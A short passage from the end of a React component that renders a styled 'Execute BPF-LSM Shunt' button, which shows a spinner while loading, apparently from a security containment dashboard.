                className="px-4 py-2 bg-rose-600 hover:bg-rose-500 disabled:opacity-50 text-white rounded text-xs font-bold transition flex items-center gap-1.5 shadow-lg shadow-rose-900/50">
                {isContainmentLoading ? <RefreshCw className="h-3.5 w-3.5 animate-spin" /> : <Lock className="h-3.5 w-3.5" />}
                Execute BPF-LSM Shunt
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
